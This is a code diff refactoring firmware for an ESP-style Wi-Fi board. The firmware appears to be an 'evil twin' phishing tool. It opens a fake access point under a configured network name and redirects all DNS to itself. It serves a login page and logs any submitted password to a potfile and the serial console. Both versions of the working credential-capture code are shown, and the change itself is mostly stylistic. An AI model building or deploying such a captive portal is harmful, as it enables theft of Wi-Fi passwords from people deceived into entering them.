@@ -4,45 +4,23 @@
 #include <DNSServer.h>
 #include <LittleFS.h>
 #include <ESPAsyncWebServer.h>
-const byte DNS_PORT = 53;
-const byte STATUS_OK = 200;
 
-IPAddress gateway(192,168,0,1);
-IPAddress subnet(255,255,255,0);
+const byte DNS_PORT { 53 };
+const byte STATUS_OK { 200 };
+
+const IPAddress gateway(192,168,0,1);
+const IPAddress netmask(255,255,255,0);
+
 AsyncWebServer web(80);
-
 DNSServer dns;
-
-void display_potfile();
-
 String webpage;
 
 void show_form(AsyncWebServerRequest *request) {
   request->send(200, "text/html", webpage);
 }
 
-void write_to_potfile(const char* s) {
-  File potfile = LittleFS.open("potfile.txt", "a");
-  if (!potfile) {
-    Serial.println("error: failed to open potfile.txt for writing");
-    return;
-  }
-  potfile.println(s);
-  potfile.close();
-}
-
-void capture_post(AsyncWebServerRequest *request) {
-  if (request->hasParam("password", true)) {
-    const AsyncWebParameter *p = request->getParam("password", true);
-    const char* password = p->value().c_str();
-    Serial.printf("core::capture_post captured %s\n", password);
-    write_to_potfile(password);
-  }
-  show_form(request);
-}
-
 void display_potfile() {
-  File potfile = LittleFS.open("potfile.txt", "r");
+  File potfile { LittleFS.open("potfile.txt", "r") };
   if (!potfile) {
     Serial.println("warning: failed to open potfile.txt for reading");
     return;
@@ -53,16 +31,37 @@ void display_potfile() {
   potfile.close();
 }
 
+void write_to_potfile(const char* s) {
+  File potfile { LittleFS.open("potfile.txt", "a") };
+  if (!potfile) {
+    Serial.println("error: failed to open potfile.txt for writing");
+    return;
+  }
+  potfile.println(s);
+  potfile.close();
+}
+
+void capture_password(AsyncWebServerRequest *request) {
+  constexpr const char* parameter_name { "password" };
+  if (request->hasParam(parameter_name, true)) {
+    const AsyncWebParameter *parameter { request->getParam(parameter_name, true) };
+    const char* password { parameter->value().c_str() };
+    Serial.printf("core::capture_password captured %s\n", password);
+    write_to_potfile(password);
+  }
+  show_form(request);
+}
+
 typedef struct Config {
-  bool error;
   String essid;
   String vendor;
+  bool error;
 } Config;
 
 Config load_config() {
-  File config_file = LittleFS.open("config.ini", "r");
+  File config_file { LittleFS.open("config.ini", "r") };
   if (!config_file) {
-    Serial.println("fatal: failed to open config for reading");
+    Serial.println("fatal: failed to open configuration file for reading");
     return Config { error: true };
   }
 
@@ -70,24 +69,29 @@ Config load_config() {
   String essid;
   String vendor;
   bool key { true };
-  int captured = 0;
+  int captured { 0 };
+
   while(config_file.available()) {
     if (key) {
       fragment = config_file.readStringUntil('=');
       key = false;
       continue;
     }
+    String value { config_file.readStringUntil('\n') };
     if (fragment == "essid") {
       captured++;
-      essid = config_file.readStringUntil('\n');
+      essid = value;
     }
     if (fragment == "vendor") {
       captured++;
-      vendor = config_file.readStringUntil('\n');
+      vendor = value;
     }
     key = true;
   }
-  if (captured == 2) return Config { error: false, essid: essid, vendor: vendor };
+
+  if (captured == 2) {
+    return Config { essid, vendor };
+  }
   return Config { error: true };
 }
 
@@ -96,22 +100,22 @@ void setup() {
   Serial.println("\r");
   Serial.println("core::setup starting ap");
   
-  if (!LittleFS.begin()){
+  if (!LittleFS.begin()) {
     Serial.println("error: failed to mount LittleFS");
     return;
   }
   Serial.println("core::setup displaying passwords collected");
   display_potfile();
 
-  Config config = load_config();
+  Config config { load_config() };
   if (config.error) {
     Serial.println("fatal: configuration file is invalid");
     return;
   }
-  WiFi.softAPConfig(gateway, gateway, subnet);
+  WiFi.softAPConfig(gateway, gateway, netmask);
   WiFi.softAP(config.essid);
 
-  File web_file = LittleFS.open("index.html", "r");
+  File web_file { LittleFS.open("index.html", "r") };
   if (!web_file) {
     Serial.println("fatal: failed to open web page for reading");
     return;
@@ -125,7 +129,7 @@ void setup() {
   dns.start(DNS_PORT, "*", gateway);
 
   web.on("/", HTTP_GET, show_form);
-  web.on("/", HTTP_POST, capture_post);
+  web.on("/", HTTP_POST, capture_password);
   web.onNotFound(show_form);
   web.begin();
 }
